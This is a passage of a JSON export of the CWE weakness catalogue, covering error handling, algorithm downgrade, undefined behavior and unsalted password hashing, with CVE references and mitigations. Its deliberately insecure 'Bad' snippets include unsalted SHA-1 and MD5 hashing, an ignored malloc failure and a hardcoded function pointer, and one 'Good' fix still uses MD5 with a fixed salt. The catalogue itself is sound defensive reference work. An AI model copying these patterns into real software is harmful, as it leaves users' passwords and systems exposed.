            "John Viega"
          ],
          "Title": "24 Deadly Sins of Software Security",
          "Publication": "McGraw-Hill",
          "PublicationYear": "2010"
        },
        {
          "ExternalReferenceID": "REF-622",
          "Authors": [
            "Frank Kim"
          ],
          "Title": "Top 25 Series - Rank 15 - Improper Check for Unusual or Exceptional Conditions",
          "PublicationYear": "2010",
          "PublicationMonth": "03",
          "PublicationDay": "15",
          "Publisher": "SANS Software Security Institute",
          "URL": "https://www.sans.org/blog/top-25-series-rank-15-improper-check-for-unusual-or-exceptional-conditions/",
          "URLDate": "2023-04-07"
        }
      ],
      "MappingNotes": {
        "Usage": "Allowed-with-Review",
        "Rationale": "This CWE entry is a Class and might have Base-level children that would be more appropriate",
        "Comments": "Examine children of this entry to see if there is a better fit",
        "Reasons": [
          "Abstraction"
        ]
      },
      "Notes": [
        {
          "Type": "Relationship",
          "Note": "Sometimes, when a return value can be used to indicate an error, an unchecked return value is a code-layer instance of a missing application-layer check for exceptional conditions. However, return values are not always needed to communicate exceptional conditions. For example, expiration of resources, values passed by reference, asynchronously modified data, sockets, etc. may indicate exceptional conditions without the use of a return value."
        }
      ]
    },
    {
      "ID": "755",
      "Name": "Improper Handling of Exceptional Conditions",
      "Abstraction": "Class",
      "Structure": "Simple",
      "Status": "Incomplete",
      "Description": "The product does not handle or incorrectly handles an exceptional condition.",
      "LikelihoodOfExploit": "Medium",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "703",
          "ViewID": "1000",
          "Ordinal": "Primary"
        }
      ],
      "ApplicablePlatforms": [
        {
          "Type": "Language",
          "Class": "Not Language-Specific",
          "Prevalence": "Undetermined"
        }
      ],
      "ModesOfIntroduction": [
        {
          "Phase": "Implementation",
          "Note": "REALIZATION: This weakness is caused during implementation of an architectural security tactic."
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Other"
          ],
          "Impact": [
            "Other"
          ]
        }
      ],
      "DemonstrativeExamples": [
        {
          "ID": "DX-39",
          "Entries": [
            {
              "IntroText": "The following example attempts to resolve a hostname."
            },
            {
              "Nature": "Bad",
              "Language": "Java",
              "ExampleCode": "```\n\tprotected void doPost (HttpServletRequest req, HttpServletResponse res) throws IOException {\n\t\tString ip = req.getRemoteAddr();\n\t\tInetAddress addr = InetAddress.getByName(ip);\n\t\t...\n\t\tout.println(\"hello \" + addr.getHostName());\n\t}\n```"
            },
            {
              "BodyText": "A DNS lookup failure will cause the Servlet to throw an exception."
            }
          ]
        },
        {
          "ID": "DX-201",
          "Entries": [
            {
              "IntroText": "The following example attempts to allocate memory for a character. After the call to malloc, an if statement is used to check whether the malloc function failed."
            },
            {
              "Nature": "Bad",
              "Language": "C",
              "ExampleCode": "```\n\tfoo=malloc(sizeof(char)); //the next line checks to see if malloc failed\n\tif (foo==NULL) {\n\t\t//We do nothing so we just ignore the error.\n\t}\n```"
            },
            {
              "BodyText": "The conditional successfully detects a NULL return value from malloc indicating a failure, however it does not do anything to handle the problem. Unhandled errors may have unexpected results and may cause the program to crash or terminate."
            },
            {
              "BodyText": "Instead, the if block should contain statements that either attempt to fix the problem or notify the user that an error has occurred and continue processing or perform some cleanup and gracefully terminate the program. The following example notifies the user that the malloc function did not allocate the required memory resources and returns an error code."
            },
            {
              "Nature": "Good",
              "Language": "C",
              "ExampleCode": "```\n\tfoo=malloc(sizeof(char)); //the next line checks to see if malloc failed\n\tif (foo==NULL) {\n\t\tprintf(\"Malloc failed to allocate memory resources\");\n\t\treturn -1;\n\t}\n```"
            }
          ]
        },
        {
          "ID": "DX-202",
          "Entries": [
            {
              "IntroText": "The following code mistakenly catches a NullPointerException."
            },
            {
              "Nature": "Bad",
              "Language": "Java",
              "ExampleCode": "```\n\ttry { \n\t\t mysteryMethod(); \n\t } catch (NullPointerException npe) {\n\t }\n```"
            }
          ]
        }
      ],
      "ObservedExamples": [
        {
          "Reference": "CVE-2023-41151",
          "Description": "SDK for OPC Unified Architecture (OPC UA) server has uncaught exception when a socket is blocked for writing but the server tries to send an error",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2023-41151"
        },
        {
          "Reference": "[REF-1374]",
          "Description": "Chain: JavaScript-based cryptocurrency library can fall back to the insecure Math.random() function instead of reporting a failure (CWE-392), thus reducing the entropy (CWE-332) and leading to generation of non-unique cryptographic keys for Bitcoin wallets (CWE-1391)",
          "Link": "https://www.unciphered.com/blog/randstorm-you-cant-patch-a-house-of-cards"
        },
        {
          "Reference": "CVE-2021-3011",
          "Description": "virtual interrupt controller in a virtualization product allows crash of host by writing a certain invalid value to a register, which triggers a fatal error instead of returning an error code",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2021-3011"
        },
        {
          "Reference": "CVE-2008-4302",
          "Description": "Chain: OS kernel does not properly handle a failure of a function call (CWE-755), leading to an unlock of a resource that was not locked (CWE-832), with resultant crash.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2008-4302"
        }
      ],
      "References": [
        {
          "ExternalReferenceID": "REF-1374",
          "Authors": [
            "Unciphered"
          ],
          "Title": "Randstorm: You Can't Patch a House of Cards",
          "PublicationYear": "2023",
          "PublicationMonth": "11",
          "PublicationDay": "14",
          "URL": "https://www.unciphered.com/blog/randstorm-you-cant-patch-a-house-of-cards",
          "URLDate": "2023-11-15"
        }
      ],
      "MappingNotes": {
        "Usage": "Discouraged",
        "Rationale": "This CWE entry is a level-1 Class (i.e., a child of a Pillar). It might have lower-level children that would be more appropriate",
        "Comments": "Examine children of this entry to see if there is a better fit",
        "Reasons": [
          "Abstraction"
        ]
      }
    },
    {
      "ID": "756",
      "Name": "Missing Custom Error Page",
      "Abstraction": "Base",
      "Structure": "Simple",
      "Status": "Incomplete",
      "Description": "The product does not return custom error pages to the user, possibly exposing sensitive information.",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "755",
          "ViewID": "1000",
          "Ordinal": "Primary"
        },
        {
          "Nature": "CanPrecede",
          "CweID": "209",
          "ViewID": "1000"
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Confidentiality"
          ],
          "Impact": [
            "Read Application Data"
          ],
          "Note": "Attackers can leverage the additional information provided by a default error page to mount attacks targeted on the framework, database, or other resources used by the application."
        }
      ],
      "DemonstrativeExamples": [
        {
          "ID": "DX-76",
          "Entries": [
            {
              "IntroText": "In the snippet below, an unchecked runtime exception thrown from within the try block may cause the container to display its default error page (which may contain a full stack trace, among other things)."
            },
            {
              "Nature": "Bad",
              "Language": "Java",
              "ExampleCode": "```\n\tPublic void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n\t\ttry {\n\t\t\t...\n\t\t} catch (ApplicationSpecificException ase) {\n\t\t\tlogger.error(\"Caught: \" + ase.toString());\n\t\t}\n\t}\n```"
            }
          ]
        },
        {
          "ID": "DX-75",
          "Entries": [
            {
              "IntroText": "The mode attribute of the <customErrors> tag in the Web.config file defines whether custom or default error pages are used."
            },
            {
              "BodyText": "In the following insecure ASP.NET application setting, custom error message mode is turned off. An ASP.NET error message with detailed stack trace and platform versions will be returned."
            },
            {
              "Nature": "Bad",
              "Language": "ASP.NET",
              "ExampleCode": "```\n\t<customErrors mode=\"Off\" />\n```"
            },
            {
              "BodyText": "A more secure setting is to set the custom error message mode for remote users only. No defaultRedirect error page is specified. The local user on the web server will see a detailed stack trace. For remote users, an ASP.NET error message with the server customError configuration setting and the platform version will be returned."
            },
            {
              "Nature": "Good",
              "Language": "ASP.NET",
              "ExampleCode": "```\n\t<customErrors mode=\"RemoteOnly\" />\n```"
            },
            {
              "BodyText": "Another secure option is to set the mode attribute of the <customErrors> tag to use a custom page as follows:"
            },
            {
              "Nature": "Good",
              "Language": "ASP.NET",
              "ExampleCode": "```\n\t<customErrors mode=\"On\" defaultRedirect=\"YourErrorPage.htm\" />\n```"
            }
          ]
        }
      ],
      "MappingNotes": {
        "Usage": "Allowed",
        "Rationale": "This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.",
        "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.",
        "Reasons": [
          "Acceptable-Use"
        ]
      }
    },
    {
      "ID": "757",
      "Name": "Selection of Less-Secure Algorithm During Negotiation ('Algorithm Downgrade')",
      "Abstraction": "Base",
      "Structure": "Simple",
      "Status": "Incomplete",
      "Description": "A protocol or its implementation supports interaction between multiple actors and allows those actors to negotiate which algorithm should be used as a protection mechanism such as encryption or authentication, but it does not select the strongest algorithm that is available to both parties.",
      "ExtendedDescription": "When a security mechanism can be forced to downgrade to use a less secure algorithm, this can make it easier for attackers to compromise the product by exploiting weaker algorithm. The victim might not be aware that the less secure algorithm is being used. For example, if an attacker can force a communications channel to use cleartext instead of strongly-encrypted data, then the attacker could read the channel by sniffing, instead of going through extra effort of trying to decrypt the data using brute force techniques.",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "693",
          "ViewID": "1000",
          "Ordinal": "Primary"
        }
      ],
      "ModesOfIntroduction": [
        {
          "Phase": "Architecture and Design",
          "Note": "COMMISSION: This weakness refers to an incorrect design related to an architectural security tactic."
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Access Control"
          ],
          "Impact": [
            "Bypass Protection Mechanism"
          ]
        }
      ],
      "DetectionMethods": [
        {
          "DetectionMethodID": "DM-14",
          "Method": "Automated Static Analysis",
          "Description": "Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect \"sources\" (origins of input) with \"sinks\" (destinations where the data interacts with external components, a lower layer such as the OS, etc.)",
          "Effectiveness": "High"
        }
      ],
      "ObservedExamples": [
        {
          "Reference": "CVE-2006-4302",
          "Description": "Attacker can select an older version of the software to exploit its vulnerabilities.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2006-4302"
        },
        {
          "Reference": "CVE-2006-4407",
          "Description": "Improper prioritization of encryption ciphers during negotiation leads to use of a weaker cipher.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2006-4407"
        },
        {
          "Reference": "CVE-2005-2969",
          "Description": "chain: SSL/TLS implementation disables a verification step (CWE-325) that enables a downgrade attack to a weaker protocol.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2005-2969"
        },
        {
          "Reference": "CVE-2001-1444",
          "Description": "Telnet protocol implementation allows downgrade to weaker authentication and encryption using an Adversary-in-the-Middle AITM attack.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2001-1444"
        },
        {
          "Reference": "CVE-2002-1646",
          "Description": "SSH server implementation allows override of configuration setting to use weaker authentication schemes. This may be a composite with CWE-642.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2002-1646"
        }
      ],
      "RelatedAttackPatterns": [
        "220",
        "606",
        "620"
      ],
      "MappingNotes": {
        "Usage": "Allowed",
        "Rationale": "This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.",
        "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.",
        "Reasons": [
          "Acceptable-Use"
        ]
      },
      "Notes": [
        {
          "Type": "Relationship",
          "Note": "This is related to CWE-300, although not all downgrade attacks necessarily require an entity that redirects or interferes with the network. See examples."
        }
      ]
    },
    {
      "ID": "758",
      "Name": "Reliance on Undefined, Unspecified, or Implementation-Defined Behavior",
      "Abstraction": "Class",
      "Structure": "Simple",
      "Status": "Incomplete",
      "Description": "The product uses an API function, data structure, or other entity in a way that relies on properties that are not always guaranteed to hold for that entity.",
      "ExtendedDescription": "This can lead to resultant weaknesses when the required properties change, such as when the product is ported to a different platform or if an interaction error (CWE-435) occurs.",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "710",
          "ViewID": "1000",
          "Ordinal": "Primary"
        }
      ],
      "WeaknessOrdinalities": [
        {
          "Ordinality": "Indirect"
        },
        {
          "Ordinality": "Primary"
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Other"
          ],
          "Impact": [
            "Other"
          ]
        }
      ],
      "DetectionMethods": [
        {
          "DetectionMethodID": "DM-13",
          "Method": "Fuzzing",
          "Description": "Fuzz testing (fuzzing) is a powerful technique for generating large numbers of diverse inputs - either randomly or algorithmically - and dynamically invoking the code with those inputs. Even with random inputs, it is often capable of generating unexpected results such as crashes, memory corruption, or resource consumption. Fuzzing effectively produces repeatable test cases that clearly indicate bugs, which helps developers to diagnose the issues.",
          "Effectiveness": "High"
        }
      ],
      "DemonstrativeExamples": [
        {
          "ID": "DX-192",
          "Entries": [
            {
              "IntroText": "This code assumes a particular function will always be found at a particular address. It assigns a pointer to that address and calls the function."
            },
            {
              "Nature": "Bad",
              "Language": "C",
              "ExampleCode": "```\n\tint (*pt2Function) (float, char, char)=0x08040000;\n\tint result2 = (*pt2Function) (12, 'a', 'b');\n```\n// Here we can inject code to execute.*"
            },
            {
              "BodyText": "The same function may not always be found at the same memory address. This could lead to a crash, or an attacker may alter the memory at the expected address, leading to arbitrary code execution."
            }
          ]
        },
        {
          "ID": "DX-203",
          "Entries": [
            {
              "IntroText": "The following function returns a stack address."
            },
            {
              "Nature": "Bad",
              "Language": "C",
              "ExampleCode": "```\n\tchar* getName() {\n\t\tchar name[STR_MAX];\n\t\tfillInName(name);\n\t\treturn name;\n\t}\n```"
            }
          ]
        }
      ],
      "ObservedExamples": [
        {
          "Reference": "CVE-2006-1902",
          "Description": "Change in C compiler behavior causes resultant buffer overflows in programs that depend on behaviors that were undefined in the C standard.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2006-1902"
        }
      ],
      "TaxonomyMappings": [
        {
          "TaxonomyName": "CERT C Secure Coding",
          "EntryID": "ARR32-C",
          "EntryName": "Ensure size arguments for variable length arrays are in a valid range",
          "MappingFit": "CWE More Abstract"
        },
        {
          "TaxonomyName": "CERT C Secure Coding",
          "EntryID": "ERR34-C",
          "EntryName": "Detect errors when converting a string to a number",
          "MappingFit": "Imprecise"
        },
        {
          "TaxonomyName": "CERT C Secure Coding",
          "EntryID": "EXP30-C",
          "EntryName": "Do not depend on the order of evaluation for side effects",
          "MappingFit": "CWE More Abstract"
        },
        {
          "TaxonomyName": "CERT C Secure Coding",
          "EntryID": "EXP33-C",
          "EntryName": "Do not read uninitialized memory",
          "MappingFit": "CWE More Abstract"
        },
        {
          "TaxonomyName": "CERT C Secure Coding",
          "EntryID": "FIO46-C",
          "EntryName": "Do not access a closed file",
          "MappingFit": "CWE More Abstract"
        },
        {
          "TaxonomyName": "CERT C Secure Coding",
          "EntryID": "INT34-C",
          "EntryName": "Do not shift an expression by a negative number of bits or by greater than or equal  to the number of bits that exist in the operand",
          "MappingFit": "CWE More Abstract"
        },
        {
          "TaxonomyName": "CERT C Secure Coding",
          "EntryID": "INT36-C",
          "EntryName": "Converting a pointer to integer or integer to pointer",
          "MappingFit": "CWE More Abstract"
        },
        {
          "TaxonomyName": "CERT C Secure Coding",
          "EntryID": "MEM30-C",
          "EntryName": "Do not access freed memory",
          "MappingFit": "CWE More Abstract"
        },
        {
          "TaxonomyName": "CERT C Secure Coding",
          "EntryID": "MSC14-C",
          "EntryName": "Do not introduce unnecessary platform dependencies"
        },
        {
          "TaxonomyName": "CERT C Secure Coding",
          "EntryID": "MSC15-C",
          "EntryName": "Do not depend on undefined behavior"
        },
        {
          "TaxonomyName": "CERT C Secure Coding",
          "EntryID": "MSC37-C",
          "EntryName": "Ensure that control never reaches the end of a non-void function",
          "MappingFit": "CWE More Abstract"
        }
      ],
      "MappingNotes": {
        "Usage": "Allowed-with-Review",
        "Rationale": "This CWE entry is a Class and might have Base-level children that would be more appropriate",
        "Comments": "Examine children of this entry to see if there is a better fit",
        "Reasons": [
          "Abstraction"
        ]
      }
    },
    {
      "ID": "759",
      "Name": "Use of a One-Way Hash without a Salt",
      "Abstraction": "Variant",
      "Structure": "Simple",
      "Status": "Incomplete",
      "Description": "The product uses a one-way cryptographic hash against an input that should not be reversible, such as a password, but the product does not also use a salt as part of the input.",
      "ExtendedDescription": "\n\nThis makes it easier for attackers to pre-compute the hash value using dictionary attack techniques such as rainbow tables.\n\n\nIt should be noted that, despite common perceptions, the use of a good salt with a hash does not sufficiently increase the effort for an attacker who is targeting an individual password, or who has a large amount of computing resources available, such as with cloud-based services or specialized, inexpensive hardware. Offline password cracking can still be effective if the hash function is not expensive to compute; many cryptographic functions are designed to be efficient and can be vulnerable to attacks using massive computing resources, even if the hash is cryptographically strong. The use of a salt only slightly increases the computing requirements for an attacker compared to other strategies such as adaptive hash functions. See CWE-916 for more details.\n",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "916",
          "ViewID": "1000",
          "Ordinal": "Primary"
        }
      ],
      "BackgroundDetails": [
        "In cryptography, salt refers to some random addition of data to an input before hashing to make dictionary attacks more difficult."
      ],
      "ModesOfIntroduction": [
        {
          "Phase": "Implementation",
          "Note": "REALIZATION: This weakness is caused during implementation of an architectural security tactic."
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Access Control"
          ],
          "Impact": [
            "Bypass Protection Mechanism",
            "Gain Privileges or Assume Identity"
          ],
          "Note": "If an attacker can gain access to the hashes, then the lack of a salt makes it easier to conduct brute force attacks using techniques such as rainbow tables."
        }
      ],
      "DetectionMethods": [
        {
          "Method": "Automated Static Analysis - Binary or Bytecode",
          "Description": "\n\nAccording to SOAR, the following detection techniques may be useful:\n\n```\n\t\tCost effective for partial coverage:\n```\n\n\t\tBytecode Weakness Analysis - including disassembler + source code weakness analysis\n\t\tBinary Weakness Analysis - including disassembler + source code weakness analysis",
          "Effectiveness": "SOAR Partial"
        },
        {
          "Method": "Manual Static Analysis - Binary or Bytecode",
          "Description": "\n\nAccording to SOAR, the following detection techniques may be useful:\n\n```\n\t\tCost effective for partial coverage:\n```\n\n\t\tBinary / Bytecode disassembler - then use manual analysis for vulnerabilities & anomalies",
          "Effectiveness": "SOAR Partial"
        },
        {
          "Method": "Manual Static Analysis - Source Code",
          "Description": "\n\nAccording to SOAR, the following detection techniques may be useful:\n\n```\n\t\tHighly cost effective:\n```\n\n\t\tFocused Manual Spotcheck - Focused manual analysis of source\n\t\tManual Source Code Review (not inspections)",
          "Effectiveness": "High"
        },
        {
          "Method": "Automated Static Analysis - Source Code",
          "Description": "\n\nAccording to SOAR, the following detection techniques may be useful:\n\n```\n\t\tHighly cost effective:\n```\n\n\t\tSource code Weakness Analyzer\n\t\tContext-configured Source Code Weakness Analyzer",
          "Effectiveness": "High"
        },
        {
          "Method": "Automated Static Analysis",
          "Description": "\n\nAccording to SOAR, the following detection techniques may be useful:\n\n```\n\t\tCost effective for partial coverage:\n```\n\n\t\tConfiguration Checker",
          "Effectiveness": "SOAR Partial"
        },
        {
          "Method": "Architecture or Design Review",
          "Description": "\n\nAccording to SOAR, the following detection techniques may be useful:\n\n```\n\t\tHighly cost effective:\n```\n\n\t\tFormal Methods / Correct-By-Construction\n\t```\n\t\tCost effective for partial coverage:\n```\n\n\t\tInspection (IEEE 1028 standard) (can apply to requirements, design, source code, etc.)",
          "Effectiveness": "High"
        }
      ],
      "PotentialMitigations": [
        {
          "MitigationID": "MIT-51",
          "Phase": [
            "Architecture and Design"
          ],
          "Description": "\n\nUse an adaptive hash function that can be configured to change the amount of computational effort needed to compute the hash, such as the number of iterations (\"stretching\") or the amount of memory required. Some hash functions perform salting automatically. These functions can significantly increase the overhead for a brute force attack compared to intentionally-fast functions such as MD5. For example, rainbow table attacks can become infeasible due to the high computing overhead. Finally, since computing power gets faster and cheaper over time, the technique can be reconfigured to increase the workload without forcing an entire replacement of the algorithm in use.\n\n\nSome hash functions that have one or more of these desired properties include bcrypt [REF-291], scrypt [REF-292], and PBKDF2 [REF-293]. While there is active debate about which of these is the most effective, they are all stronger than using salts with hash functions with very little computing overhead.\n\n\nNote that using these functions can have an impact on performance, so they require special consideration to avoid denial-of-service attacks. However, their configurability provides finer control over how much CPU and memory is used, so it could be adjusted to suit the environment's needs.\n",
          "Effectiveness": "High"
        },
        {
          "Phase": [
            "Architecture and Design"
          ],
          "Description": "If a technique that requires extra computational effort can not be implemented, then for each password that is processed, generate a new random salt using a strong random number generator with unpredictable seeds. Add the salt to the plaintext password before hashing it. When storing the hash, also store the salt. Do not use the same salt for every password.",
          "Effectiveness": "Limited",
          "EffectivenessNotes": "Be aware that salts will not reduce the workload of a targeted attack against an individual hash (such as the password for a critical person), and in general they are less effective than other hashing techniques such as increasing the computation time or memory overhead. Without a built-in workload, modern attacks can compute large numbers of hashes, or even exhaust the entire space of all possible passwords, within a very short amount of time, using massively-parallel computing and GPU, ASIC, or FPGA hardware."
        },
        {
          "MitigationID": "MIT-25",
          "Phase": [
            "Implementation",
            "Architecture and Design"
          ],
          "Description": "When using industry-approved techniques, use them correctly. Don't cut corners by skipping resource-intensive steps (CWE-325). These steps are often essential for preventing common attacks."
        }
      ],
      "DemonstrativeExamples": [
        {
          "ID": "DX-101",
          "Entries": [
            {
              "IntroText": "In both of these examples, a user is logged in if their given password matches a stored password:"
            },
            {
              "Nature": "Bad",
              "Language": "C",
              "ExampleCode": "```\n\tunsigned char *check_passwd(char *plaintext) {\n\t\tctext = simple_digest(\"sha1\",plaintext,strlen(plaintext), ... );\n```\n//Login if hash matches stored hash* \n\t\tif (equal(ctext, secret_password())) {\n\t\t```\n\t\t\tlogin_user();\n\t\t}\n\t}\n```"
            },
            {
              "Nature": "Bad",
              "Language": "Java",
              "ExampleCode": "```\n\tString plainText = new String(plainTextIn);\n\tMessageDigest encer = MessageDigest.getInstance(\"SHA\");\n\tencer.update(plainTextIn);\n\tbyte[] digest = password.digest();\n```\n//Login if hash matches stored hash* \n\tif (equal(digest,secret_password())) {\n\t```\n\t\tlogin_user();\n\t}\n```"
            },
            {
              "BodyText": "This code relies exclusively on a password mechanism (CWE-309) using only one factor of authentication (CWE-308). If an attacker can steal or guess a user's password, they are given full access to their account. Note this code also uses SHA-1, which is a weak hash (CWE-328). It also does not use a salt (CWE-759)."
            }
          ]
        },
        {
          "ID": "DX-207",
          "Entries": [
            {
              "IntroText": "In this example, a new user provides a new username and password to create an account. The program hashes the new user's password then stores it in a database."
            },
            {
              "Nature": "Bad",
              "Language": "Python",
              "ExampleCode": "```\n\tdef storePassword(userName,Password):\n\t\thasher = hashlib.new('md5')\n\t\thasher.update(Password)\n\t\thashedPassword = hasher.digest()\n```\n# UpdateUserLogin returns True on success, False otherwise* \n\t\treturn updateUserLogin(userName,hashedPassword)"
            },
            {
              "BodyText": "While it is good to avoid storing a cleartext password, the program does not provide a salt to the hashing function, thus increasing the chances of an attacker being able to reverse the hash and discover the original password if the database is compromised."
            },
            {
              "BodyText": "Fixing this is as simple as providing a salt to the hashing function on initialization:"
            },
            {
              "Nature": "Good",
              "Language": "Python",
              "ExampleCode": "```\n\tdef storePassword(userName,Password):\n\t\thasher = hashlib.new('md5',b'SaltGoesHere')\n\t\thasher.update(Password)\n\t\thashedPassword = hasher.digest()\n```\n# UpdateUserLogin returns True on success, False otherwise* \n\t\treturn updateUserLogin(userName,hashedPassword)"
            },
            {
              "BodyText": "Note that regardless of the usage of a salt, the md5 hash is no longer considered secure, so this example still exhibits CWE-327."
            }
          ]
        }
      ],
      "ObservedExamples": [
        {
          "Reference": "CVE-2008-1526",
          "Description": "Router does not use a salt with a hash, making it easier to crack passwords.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2008-1526"
        },
        {
          "Reference": "CVE-2006-1058",
          "Description": "Router does not use a salt with a hash, making it easier to crack passwords.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2006-1058"
        }
      ],
      "References": [
        {
          "ExternalReferenceID": "REF-291",
          "Authors": [
            "Johnny Shelley"
          ],
          "Title": "bcrypt",
          "URL": "http://bcrypt.sourceforge.net/"
        },
        {
          "ExternalReferenceID": "REF-292",
          "Authors": [
            "Colin Percival"
          ],
          "Title": "Tarsnap - The scrypt key derivation function and encryption utility",
          "URL": "http://www.tarsnap.com/scrypt.html"
        },
        {
          "ExternalReferenceID": "REF-293",
          "Section": "5.2 PBKDF2",
          "Authors": [
            "B. Kaliski"
          ],
          "Title": "RFC2898 - PKCS #5: Password-Based Cryptography Specification Version 2.0",
          "PublicationYear": "2000",
          "URL": "https://www.rfc-editor.org/rfc/rfc2898",
          "URLDate": "2023-04-07"
        },
        {
          "ExternalReferenceID": "REF-294",
          "Authors": [
            "Coda Hale"
          ],
          "Title": "How To Safely Store A Password",
          "PublicationYear": "2010",
          "PublicationMonth": "01",
          "PublicationDay": "31",
          "URL": "https://codahale.com/how-to-safely-store-a-password/",
          "URLDate": "2023-04-07"
        },
        {
          "ExternalReferenceID": "REF-295",
          "Authors": [
            "Brian Krebs"
          ],
          "Title": "How Companies Can Beef Up Password Security (interview with Thomas H. Ptacek)",
          "PublicationYear": "2012",
          "PublicationMonth": "06",
          "PublicationDay": "11",
          "URL": "https://krebsonsecurity.com/2012/06/how-companies-can-beef-up-password-security/",
          "URLDate": "2023-04-07"
        },
        {
          "ExternalReferenceID": "REF-296",
          "Authors": [
            "Solar Designer"
          ],
          "Title": "Password security: past, present, future",
          "PublicationYear": "2012",
          "URL": "https://www.openwall.com/presentations/PHDays2012-Password-Security/",
          "URLDate": "2023-04-07"
        },
        {
          "ExternalReferenceID": "REF-297",
          "Authors": [
            "Troy Hunt"
          ],
          "Title": "Our password hashing has no clothes",
          "PublicationYear": "2012",
          "PublicationMonth": "06",
          "PublicationDay": "26",
          "URL": "https://www.troyhunt.com/our-password-hashing-has-no-clothes/",
          "URLDate": "2023-04-07"
        },
        {
          "ExternalReferenceID": "REF-298",
          "Authors": [
            "Joshbw"
          ],
          "Title": "Should we really use bcrypt/scrypt?",
          "PublicationYear": "2012",
          "PublicationMonth": "06",
          "PublicationDay": "08",
          "URL": "https://web.archive.org/web/20120629144851/http://www.analyticalengine.net/2012/06/should-we-really-use-bcryptscrypt/",
          "URLDate": "2023-04-07"
        },
        {
          "ExternalReferenceID": "REF-631",
          "Authors": [
            "OWASP"
          ],
          "Title": "Password Storage Cheat Sheet",
          "URL": "https://cheatsheetseries.owasp.org/cheatsheets/Password_Storage_Cheat_Sheet.html",
          "URLDate": "2023-04-07"
        },
        {
          "ExternalReferenceID": "REF-632",
          "Authors": [
            "Thomas Ptacek"
          ],
          "Title": "Enough With The Rainbow Tables: What You Need To Know About Secure Password Schemes",
          "PublicationYear": "2007",
          "PublicationMonth": "09",
          "PublicationDay": "10",
          "URL": "http://hashphp.org/hashing.html",
          "URLDate": "2023-04-07"
        },
        {
          "ExternalReferenceID": "REF-633",
          "Authors": [
            "Robert Graham"
          ],
          "Title": "The Importance of Being Canonical",
          "PublicationYear": "2009",
          "PublicationMonth": "02",
          "PublicationDay": "02",
          "URL": "https://blog.erratasec.com/2009/02/importance-of-being-canonical.html#.ZCbyY7LMJPY",
          "URLDate": "2023-04-07"
        },
        {
          "ExternalReferenceID": "REF-634",
          "Authors": [
            "James McGlinn"
          ],
          "Title": "Password Hashing",
          "URL": "https://privacyaustralia.net/phpsec/articles/password-hashing/",
          "URLDate": "2023-04-07"
        },
        {
          "ExternalReferenceID": "REF-635",
          "Authors": [
            "Jeff Atwood"
          ],
          "Title": "Rainbow Hash Cracking",
          "PublicationYear": "2007",
          "PublicationMonth": "09",
          "PublicationDay": "08",
          "URL": "https://blog.codinghorror.com/rainbow-hash-cracking/",
          "URLDate": "2023-04-07"
        },
        {
          "ExternalReferenceID": "REF-636",
          "Authors": [
            "Jeff Atwood"
          ],
          "Title": "Speed Hashing",
          "PublicationYear": "2012",
          "PublicationMonth": "04",
          "PublicationDay": "06",
          "URL": "https://blog.codinghorror.com/speed-hashing/",
          "URLDate": "2023-04-07"
        },
        {
          "ExternalReferenceID": "REF-637",
          "Title": "Rainbow table",
          "PublicationYear": "2009",
          "PublicationMonth": "03",
          "PublicationDay": "03",
          "Publisher": "Wikipedia",
          "URL": "https://en.wikipedia.org/wiki/Rainbow_table",
          "URLDate": "2023-04-07"
        },
        {
          "ExternalReferenceID": "REF-7",
          "Section": "Chapter 9, \"Creating a Salted Hash\" Page 302",
          "Authors": [
            "Michael Howard",
            "David LeBlanc"
          ],
          "Title": "Writing Secure Code",
          "Edition": "2nd Edition",
          "PublicationYear": "2002",
          "PublicationMonth": "12",
          "PublicationDay": "04",
          "Publisher": "Microsoft Press",
          "URL": "https://www.microsoftpressstore.com/store/writing-secure-code-9780735617223"
        },
        {
          "ExternalReferenceID": "REF-62",
          "Section": "Chapter 2, \"Salt Values\", Page 46",
          "Authors": [
            "Mark Dowd",
            "John McDonald",
            "Justin Schuh"
          ],
          "Title": "The Art of Software Security Assessment",
          "Edition": "1st Edition",
          "PublicationYear": "2006",
          "Publisher": "Addison Wesley"
        }
      ],
      "MappingNotes": {
        "Usage": "Allowed",
        "Rationale": "This CWE entry is at the Variant level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.",
        "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.",
        "Reasons": [
          "Acceptable-Use"
        ]
      }
    },
    {
      "ID": "760",
      "Name": "Use of a One-Way Hash with a Predictable Salt",
      "Abstraction": "Variant",
      "Structure": "Simple",
      "Status": "Incomplete",
      "Description": "The product uses a one-way cryptographic hash against an input that should not be reversible, such as a password, but the product uses a predictable salt as part of the input.",
